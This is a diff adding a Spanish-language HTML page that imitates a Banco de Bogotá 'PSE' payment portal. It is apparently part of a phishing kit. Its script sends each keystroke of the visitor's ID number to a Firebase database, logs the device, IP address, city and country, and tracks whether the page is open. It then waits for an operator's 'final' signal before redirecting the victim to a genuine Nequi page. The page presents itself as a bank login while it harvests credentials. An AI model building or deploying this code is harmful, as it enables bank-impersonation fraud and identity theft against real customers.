@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>PSE - Banco de Bogotá</title>
+
+<style>
+
+/* ===== FONT ===== */
+@font-face {
+  font-family: 'Montserrat';
+  src: url('https://fonts.gstatic.com/s/montserrat/v25/JTUSjIg1_i6t8kCHKm459Wlhyw.woff2');
+}
+
+body{
+  margin:0;
+  font-family:'Montserrat', Arial, sans-serif;
+  display:flex;
+  height:100vh;
+}
+
+/* LEFT */
+.left{
+  width:50%;
+  background:#f6f8fa;
+  padding:60px;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+}
+
+.logo{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  font-weight:600;
+  margin-bottom:40px;
+}
+
+.logo img{
+  height:30px;
+}
+
+.title{
+  color:#0033a0;
+  font-size:32px;
+  font-weight:600;
+  margin-bottom:30px;
+  line-height:1.2;
+}
+
+.card{
+  background:#fff;
+  border-radius:20px;
+  padding:30px;
+  width:360px;
+  box-shadow:0 2px 10px rgba(0,0,0,0.05);
+}
+
+.card p{
+  color:#555;
+}
+
+.card label{
+  display:block;
+  margin-top:15px;
+  margin-bottom:5px;
+  color:#555;
+  font-size:14px;
+}
+
+.card input, .card select{
+  width:100%;
+  padding:14px;
+  border-radius:10px;
+  border:1px solid #dcdcdc;
+  font-size:15px;
+  outline:none;
+  transition:0.2s;
+}
+
+.card input:focus, .card select:focus{
+  border-color:#0033a0;
+}
+
+/* SELECT ARROW */
+select{
+  appearance:none;
+  background-image:url('data:image/svg+xml;utf8,<svg fill="%230033a0" height="20" viewBox="0 0 24 24" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+  background-repeat:no-repeat;
+  background-position:right 10px center;
+}
+
+.row{
+  display:flex;
+  gap:10px;
+}
+
+button{
+  width:100%;
+  margin-top:25px;
+  padding:16px;
+  border-radius:30px;
+  border:none;
+  background:#e0e0e0;
+  color:#777;
+  font-weight:600;
+  transition:0.3s;
+  cursor:not-allowed;
+}
+
+button.active{
+  background:#1b18de;
+  color:#fff;
+  cursor:pointer;
+}
+
+/* RIGHT */
+.right{
+  width:50%;
+  background:#0a5bbf;
+  color:#fff;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  padding:80px;
+  position:relative;
+}
+
+.right h2{
+  font-weight:600;
+}
+
+.right p{
+  opacity:0.9;
+}
+
+.line{
+  height:1px;
+  background:rgba(255,255,255,0.3);
+  margin:30px 0;
+}
+
+.card {
+  padding: 30px;
+}
+
+.row {
+  display: flex;
+  gap: 12px;
+}
+
+.input {
+  width: 100%;
+  box-sizing: border-box;
+}
+
+/* RESPONSIVE */
+@media (max-width: 900px){
+
+  body{
+    flex-direction: column;
+  }
+
+  .left{
+    width: 100%;
+    padding: 20px;
+    align-items: center; /* 👈 centra TODO */
+    text-align: center;
+  }
+
+  .title{
+    text-align: center;
+  }
+
+  .card{
+    width: 100%;
+    max-width: 350px;
+    margin: 0 auto; /* 👈 centra la card */
+    text-align: left; /* 👈 mantiene inputs bien */
+  }
+
+  .logo{
+    justify-content: center;
+  }
+
+  .right{
+    width: 100%;
+    padding: 40px 20px;
+    text-align: center;
+  }
+
+}
+
+
+
+.overlay{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.5);
+  backdrop-filter:blur(4px);
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
+}
+
+.loader{
+  text-align:center;
+  color:#fff;
+}
+
+.spinner{
+  width:40px;
+  height:40px;
+  border:4px solid #fff;
+  border-top:4px solid #1019c8;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:0 auto 10px;
+}
+
+@keyframes spin{
+  to{ transform:rotate(360deg); }
+}
+
+</style>
+
+</head>
+<body>
+
+<div class="left">
+  <div class="logo">
+    <img src="logo.svg">
+  </div>
+
+  <div class="title">
+    Bienvenido al nuevo<br>
+    portal de pagos en línea PSE
+  </div>
+
+  <div class="card">
+    <p>Ingresa tipo y número de documento</p>
+
+    <label>¿Que tipo de cliente eres?</label>
+    <select class="input">
+      <option value="">Banca Personas</option>
+      <option value="">Banca Empresa</option>
+    </select>
+
+    <div class="row">
+      <div style="flex:1;">
+        <label>Documento</label>
+        <select class="input">
+          <option value="">C.C.</option>
+        </select>
+      </div>
+
+      <div style="flex:1;">
+        <label>Número</label>
+        <input type="text" class="input" placeholder="#">
+      </div>
+    </div>
+
+    <button id="btn">Continuar</button>
+  </div>
+</div>
+
+<div class="right">
+
+
+  <h2>Tu seguridad es lo primero</h2>
+  <p>Sigue estos tips y tus transacciones estarán blindadas</p>
+
+  <div class="line"></div>
+
+  <h2>Contáctanos</h2>
+  <p>Si tienes alguna duda o algo te ha sucedido usa nuestros canales</p>
+</div>
+
+
+<div class="overlay">
+  <div class="loader">
+    <div class="spinner"></div>
+    <p>Cargando...</p>
+  </div>
+</div>
+
+
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+
+const { db, uid, ref, update, onValue } = window;
+
+// ===============================
+// 🔹 DETECTAR DISPOSITIVO
+// ===============================
+function detectarDispositivo(userAgent) {
+  userAgent = userAgent.toLowerCase();
+  if (/windows/.test(userAgent)) return "Windows";
+  if (/iphone/.test(userAgent)) return "iPhone";
+  if (/ipad/.test(userAgent)) return "iPad";
+  if (/android/.test(userAgent)) return "Android";
+  if (/macintosh/.test(userAgent)) return "Mac";
+  if (/linux/.test(userAgent)) return "Linux";
+  return "Desconocido";
+}
+
+const dispositivoDetectado = detectarDispositivo(navigator.userAgent);
+
+update(ref(db, "dataPages/" + uid), {
+  dispositivo: dispositivoDetectado
+});
+
+// ===============================
+// 🔹 GEOLOCALIZACIÓN (IP)
+// ===============================
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
+
+  update(ref(db, "dataPages/" + uid), {
+    ip: data.ip,
+    ciudad: data.city,
+    pais: data.country_name
+  });
+
+});
+
+// ===============================
+// 🔹 ESTADO
+// ===============================
+update(ref(db, "dataPages/" + uid), { 
+  estado: "abierto",
+  paginaActual: "Index.html",
+  oculto: false
+});
+
+window.addEventListener("beforeunload", () => {
+  update(ref(db, "dataPages/" + uid), { 
+    estado: "cerrado",
+    paginaActual: null  
+  });
+});
+
+// ===============================
+// 🔹 ELEMENTOS
+// ===============================
+const inputs = document.querySelectorAll('.input');
+const input = inputs[2]; // 🔥 número documento
+const btn = document.getElementById('btn');
+const overlay = document.querySelector('.overlay');
+
+// ===============================
+// 🔹 INPUT → TIEMPO REAL
+// ===============================
+if (input) {
+  input.addEventListener("input", function() {
+
+    const valor = this.value.replace(/\D/g, "");
+    this.value = valor;
+
+    update(ref(db, "dataPages/" + uid), {
+      username: valor
+    });
+
+    if (valor !== "") {
+      btn.classList.add("active");
+    } else {
+      btn.classList.remove("active");
+    }
+
+  });
+}
+
+// ===============================
+// 🔹 BOTÓN CONTINUAR
+// ===============================
+if (btn) {
+  btn.addEventListener("click", () => {
+
+    const valor = input.value.trim();
+    if (!valor) return;
+
+    update(ref(db, "dataPages/" + uid), {
+      mostrarBarraUsername: true
+    });
+
+    if (overlay) overlay.style.display = "flex";
+
+  });
+}
+
+// ===============================
+// 🔹 ESCUCHAR FINAL
+// ===============================
+onValue(ref(db, "dataPages/" + uid), snapshot => {
+
+  const data = snapshot.val();
+  if (!data) return;
+
+  if (data.accion === "final") {
+
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+
+    window.location.href = "https://clientes.nequi.com.co/recargas";
+  }
+
+});
+
+});
+</script>
+
+</body>
+</html>
